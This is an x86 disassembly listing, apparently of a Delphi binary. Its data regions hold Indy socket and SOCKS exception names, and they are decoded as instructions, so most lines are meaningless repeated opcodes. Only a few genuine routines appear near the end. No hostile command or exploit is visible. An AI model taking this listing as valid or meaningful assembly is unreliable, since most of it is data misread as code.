mov esp 0xd8004030
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xe9
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edi ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub cl 0x45
add [ eax + eax ] cl
add [ eax ] al
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
inc ebp
add [ eax + eax ] cl
add [ eax ] al
jo r-xdata
imul ebp [ edi + 0x6e ] 0x45e91c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] bl
outsb
arpl [ gs : ebp + 0x64 ] si
loopne r-xdata
inc edi
jb r-xdata
imul esp [ ebp + 0x74 ] 0x3c
popad
jns r-xdata
add [ ebx ] dl
inc ebp
dec ecx
inc ecx
insb
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ebp + 0x66 ] sp
jne r-xdata
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
insb
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0045ea ] bl
add [ eax ] al
add [ eax + ebp * 8 ] dl
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ esi ] bl
inc ebp
dec ecx
push edx
popad
dec esp
outsb
dec ebp
popad
js r-xdata
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jmp 0x51e9ff
inc eax
add [ edi ] cl
inc ebp
dec ecx
inc ebx
insb
outsd
jae r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] dl
inc ebp
dec ecx
push ebx
imul ebp [ ebp + 0x6e ] 0x63784574
jo r-xdata
jmp r-xdata
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
imul ebp [ esi + 0x65 ] 0x676e654c
je r-xdata
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ esi ] cl
inc ebp
dec ecx
push edx
popad
push esp
imul ebp [ ebp + 0x65 ] 0x9074756f
cwde
0x45 0x0
0x45 0x0
inc ebp
dec ecx
push eax
jb r-xdata
insb
imul esp [ ebx + edx * 2 + 0x65 ] 0x63697672
popad
insd
mov eax eax
inc ebp
js r-xdata
mov eax eax
je r-xdata
dec esi
inc eax
add [ 0x49644945 ] dl
outsb
jbe r-xdata
nop
add al 0xeb
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
in al dx
inc ebp
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ 0x53644945 ] dl
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
outsd
outsb
nop
in al dx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0045ec ] dl
add [ eax ] al
add [ eax + ebp * 8 ] dl
xor ah ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
in al dx
arpl [ edi + 0x6c ] bp
push edx
jo r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0045ed ] bh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
in eax dx
outsd
jb r-xdata
inc ebp
add [ eax + eax ] cl
add [ eax ] al
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add [ eax ] al
jns r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 8 + 0xc0045 ] al
jae r-xdata
add [ eax ] al
add [ esp + ebp * 8 + 0x45 ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc0045ed
inc ebp
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ebx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xed50c08b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x13 ] dl
nop
jae r-xdata
inc eax
add [ ebx ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
inc eax
add [ ecx + esi ] dl
shr ah 0xec
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add [ ecx ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
out dx al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
outsd
jb r-xdata
and dh ch
inc ebp
push ebx
jb r-xdata
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ 0x53644945 ] cl
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
in al dx
inc ebp
add [ eax + eax ] cl
add [ eax ] al
adc al 0xe8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ah ch
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al dh
inc ebp
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
push 0x6f727245
jb r-xdata
inc eax
add [ edi ] dl
inc ebp
inc eax
add [ ecx + esi ] dl
jae r-xdata
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax * 2 + 0x6f536449 ] dl
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
out dx al
popad
imul ebp [ ebp + 0x64 ] 0x45ee2090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test dh ch
inc ebp
add [ eax + eax ] cl
inc eax
add [ esi + ebp * 8 + 0x45 ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and dh ch
jb r-xdata
push ebx
jb r-xdata
rcl al 0xeb
inc ebp
add [ eax ] al
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
shl [ eax + 0x45ef ] 0x0
add [ eax ] al
outsd
outsb
inc ebp
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xef
inc ebp
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
jb r-xdata
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ ecx + esi ] dl
popad
imul ebp [ ebp + 0x64 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jmp r-xdata
push 0x45eb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 + 0x45 ] ch
add [ eax ] dl
add [ eax ] al
add [ eax + ebp * 8 ] dl
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax + 0x150045f3 ] cl
imul esp [ ebx + 0x65 ] 0x656d614e
mov eax eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
outsd
jb r-xdata
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ecx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x11 ] dl
inc ebp
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ ecx ] dl
inc ebp
dec ecx
push ebx
outsd
jb r-xdata
jb r-xdata
inc eax
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
outsb
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
out dx eax
inc ebp
hlt
int1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 + 0x45 ] ah
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
jb r-xdata
shl ah 0xf0
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
inc ebp
jb r-xdata
in al dx
out dx al
inc ebp
add [ eax ] al
jb r-xdata
rol [ eax + esi * 8 + 0x45 ] 0x0
jb r-xdata
insb
inc ebp
jb r-xdata
push esp
jb r-xdata
mov eax eax
outsd
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
inc eax
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
je r-xdata
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 8 + 0xc0045 ] al
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
outsd
outsb
outsb
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
outsd
jb r-xdata
outsd
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
inc eax
add [ ecx + esi ] dl
inc eax
add [ edx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
fdiv [ eax ]
outsb
sbb al dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc ebp
jb r-xdata
lodsb [ esi ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0xc0045 ] ch
inc ebp
rol [ edx + esi * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc ebp
jb r-xdata
jb r-xdata
jb r-xdata
nop
inc eax
add al bl
int1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
int1
inc ebp
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
jl r-xdata
outsd
jae r-xdata
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
inc ebp
add [ eax + eax ] cl
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
inc esp
in al dx
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x45 ] al
nop
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 ] dl
inc ebp
add [ eax + eax ] cl
add [ eax ] al
adc al 0xe8
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
fdiv [ eax ]
inc eax
add [ ecx + esi ] dl
push esp
dec esp
inc ebp
js r-xdata
jae r-xdata
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax * 2 + 0x6f536449 ] ah
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc eax
outsb
push edx
jne r-xdata
outsd
pop ebx
pop ebp
retn 0x4
jb r-xdata
inc eax
add [ eax ] dl
inc ebp
dec ecx
dec ecx
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
insd
insd
popad
jb r-xdata
inc ebp
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
lea eax [ eax ]
je r-xdata
jae r-xdata
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
inc ebp
add [ eax ] al
add [ eax ] al
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xd ] bh
inc ebp
add [ eax ] dl
add [ eax ] al
add [ eax + ebp * 8 ] dl
inc ebp
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add al dl
inc ebp
add [ esi ] cl
inc ebp
dec ecx
push ebx
outsd
jb r-xdata
outsb
inc ebp
adc al 0xf3
inc ebp
add [ eax ] al
add [ eax ] al
sub_45f388
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b668
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_45f3d0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_40b668
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_45f418
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45f43d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f444
retn
sub_45f450
cmpsb [ fs : esi ] [ edi ]
inc edi
add bh bh
inc [ eax ]
add [ esi + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + 0x47 ] ah
